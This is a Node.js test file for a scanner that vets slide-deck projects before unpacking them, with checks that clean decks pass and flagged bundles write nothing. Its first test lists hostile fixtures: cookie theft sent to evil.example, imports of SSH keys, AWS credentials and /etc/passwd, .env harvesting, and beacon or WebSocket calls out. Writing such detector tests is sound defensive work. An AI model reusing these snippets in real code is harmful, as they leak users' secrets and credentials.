import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readdir, readFile, mkdtemp, readdir as ls } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, relative, sep } from 'node:path';
import { scanSource } from '../bin/source-guard.mjs';
import { pack, unpack } from '../bin/source.mjs';

const one = (path, text) => scanSource([{ path, text }]);

test('a deck that reaches past itself is caught, with the line', () => {
  const bad = {
    'src/slides/01.astro': `---\nimport { readFileSync } from 'node:fs';\n---`,
    'src/slides/02.astro': `---\nconst fs = require('fs');\n---`,
    'src/slides/03.astro': `---\nconst key = process.env.OPENAI_API_KEY;\n---`,
    'src/slides/04.astro': `---\nimport { execSync } from "child_process";\n---`,
    'src/slides/05.astro': `<script>fetch("https://evil.example/?" + document.cookie)</script>`,
    'src/slides/06.astro': `---\nconst m = await import(url);\n---`,
    'src/slides/07.astro': `---\nimport key from '../../../../.ssh/id_rsa?raw';\n---`,
    'src/slides/08.astro': `---\nimport x from '/@fs/Users/me/.aws/credentials?raw';\n---`,
    'src/slides/09.astro': `---\nimport x from 'https://evil.example/x.js';\n---`,
    'src/slides/10.astro': `---\nconst f = new Function('return 1');\n---`,
    'src/styles/a.css': `@import url("file:///etc/passwd");`,
    'src/slides/11.astro': `---\nconst all = import.meta.glob('/../../**/*.env', { query: '?raw' });\n---`,
    'src/slides/12.astro': `<script>new WebSocket("wss://evil.example")</script>`,
    'src/slides/13.ts': `navigator.sendBeacon("https://evil.example", data)`,
  };
  for (const [path, text] of Object.entries(bad)) assert.ok(one(path, text).length > 0, path);
  assert.deepEqual(one('src/slides/03.astro', bad['src/slides/03.astro'])[0], { path: 'src/slides/03.astro', line: 2, why: 'reads or controls the process (process.env, process.exit, ...)' });
});

test('ordinary deck code and slide copy pass', () => {
  const good = {
    'src/slides/01.astro': `---\nimport Slide from '../components/Slide.astro';\nimport logo from '../../brand/logos/mark.svg?raw';\nimport { gsap } from 'gsap';\n---\n<Slide><h1>Our process. We ship weekly.</h1><p>WebSocket support, fetch everything, and a Function for that.</p><img src="/hero.jpg" /></Slide><div class="cluster module process" data-x="os"></div>`,
    'src/styles/deck.css': `@import url("https://fonts.googleapis.com/css2?family=Sora");\n.hero { background: url("../../public/bg.png"); } .x { background: url(data:image/png;base64,AAAA); }`,
    'story.md': `Slide 3: process.env is how we keep secrets. eval() is banned. fetch() later.`,
    'brand/brand.json': `{"name": "Acme"}`,
  };
  assert.deepEqual(scanSource(Object.entries(good).map(([path, text]) => ({ path, text }))), []);
});

test("the starter's own project passes", async () => {
  const root = new URL('..', import.meta.url).pathname;
  const { bundle } = await pack(root);
  const findings = scanSource(bundle.files.map((f) => ({ path: f.path, text: Buffer.from(f.b64, 'base64').toString('utf8') })));
  assert.deepEqual(findings, []);
});

test('a flagged bundle writes nothing', async () => {
  const root = await mkdtemp(join(tmpdir(), 'deck-guard-'));
  const bundle = { files: [{ path: 'story.md', b64: Buffer.from('# ok').toString('base64') }, { path: 'src/slides/01.astro', b64: Buffer.from(`---\nconst k = process.env.SECRET;\n---`).toString('base64') }] };
  await assert.rejects(unpack(bundle, root), /Not pulling this deck[\s\S]*src\/slides\/01.astro:2/);
  assert.deepEqual(await ls(root), []);
});
